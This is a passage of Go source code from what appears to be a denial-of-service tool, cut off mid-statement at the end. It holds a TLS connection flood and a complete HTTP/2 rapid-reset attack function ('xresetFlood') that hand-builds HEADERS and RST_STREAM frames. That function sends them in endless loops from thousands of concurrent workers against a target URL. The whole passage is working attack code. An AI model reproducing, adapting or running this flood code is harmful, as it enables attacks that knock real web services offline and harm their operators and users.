        if runtime.NumCPU() > 4 {
                workers = 4000
        }
        if runtime.NumCPU() > 8 {
                workers = 5000
        }

        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()

                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }

                                conn, err := dialTLSContext(ctx, host, u.Hostname(), []string{"http/1.1"})
                                if err != nil {
                                        select {
                                        case <-ctx.Done():
                                                return
                                        case <-time.After(5 * time.Millisecond):
                                        }
                                        continue
                                }

                                att.conns.Store(conn, conn)

                                payload := generatePayload()
                                counter := 0

                                for {
                                        select {
                                        case <-ctx.Done():
                                                att.conns.Delete(conn)
                                                conn.Close()
                                                return
                                        default:
                                        }

                                        if counter%50 == 0 {
                                                payload = generatePayload()
                                        }
                                        counter++

                                        conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
                                        if _, err := conn.Write(payload); err != nil {
                                                break
                                        }
                                }
                                att.conns.Delete(conn)
                                conn.Close()
                        }
                }()
        }

        wg.Wait()
}

// ============================================================
// L7 - XRESET (folyamatos küldés)
// ============================================================
func xresetFlood(ctx context.Context, att *activeAttack, rawURL, port string) {
        u, err := url.Parse(rawURL)
        if err != nil {
                return
        }
        host := u.Host
        if !strings.Contains(host, ":") {
                host += ":" + port
        }

        preface := []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")

        settings := []byte{
                0x00, 0x00, 0x06,
                0x04,
                0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x02,
                0x00, 0x00, 0x00, 0x00,
        }

        windowUpdate := []byte{
                0x00, 0x00, 0x04,
                0x08,
                0x00,
                0x00, 0x00, 0x00, 0x00,
                0x7F, 0xFF, 0x00, 0x00,
        }

        buildHeaderBlock := func(authority string) []byte {
                return []byte{
                        0x82,
                        0x86,
                        0x84,
                        0x01,
                        byte(len(authority)),
                }
        }

        authBytes := []byte(u.Host)

        workers := 3000
        if runtime.NumCPU() > 4 {
                workers = 4000
        }
        if runtime.NumCPU() > 8 {
                workers = 5000
        }

        var wg sync.WaitGroup

        for i := 0; i < workers; i++ {
                wg.Add(1)
                go func(id int) {
                        defer wg.Done()

                        for {
                                select {
                                case <-ctx.Done():
                                        return
                                default:
                                }

                                conn, err := dialTLSContext(ctx, host, u.Hostname(), []string{"h2"})
                                if err != nil {
                                        select {
                                        case <-ctx.Done():
                                                return
                                        case <-time.After(5 * time.Millisecond):
                                        }
                                        continue
                                }

                                att.conns.Store(conn, conn)

                                conn.Write(preface)
                                conn.Write(settings)
                                conn.Write(windowUpdate)

                                headerBlock := append(buildHeaderBlock(u.Host), authBytes...)
                                headerLen := len(headerBlock)

                                streamID := uint32(1)

                                for {
                                        select {
                                        case <-ctx.Done():
                                                att.conns.Delete(conn)
                                                conn.Close()
                                                return
                                        default:
                                        }

                                        headers := make([]byte, 9+headerLen)
                                        headers[0] = byte(headerLen >> 16)
                                        headers[1] = byte(headerLen >> 8)
                                        headers[2] = byte(headerLen)
                                        headers[3] = 0x01
                                        headers[4] = 0x05
                                        headers[5] = byte(streamID >> 24)
                                        headers[6] = byte(streamID >> 16)
                                        headers[7] = byte(streamID >> 8)
                                        headers[8] = byte(streamID)
                                        copy(headers[9:], headerBlock)

                                        rst := []byte{
                                                0x00, 0x00, 0x04,
                                                0x03,
                                                0x00,
                                                byte(streamID >> 24), byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
                                                0x00, 0x00, 0x00, 0x08,
                                        }

                                        conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
                                        if _, err := conn.Write(headers); err != nil {
                                                break
                                        }
                                        if _, err := conn.Write(rst); err != nil {
                                                break
                                        }

                                        streamID += 2
                                }
                                att.conns.Delete(conn)
                                conn.Close()
                        }
                }(i)
        }

        wg.Wait()
}

// binary helper
var _ = binary.BigEndian
var _ = atomic.AddInt64
var _ = rng
var _ = rngMu
var _ =
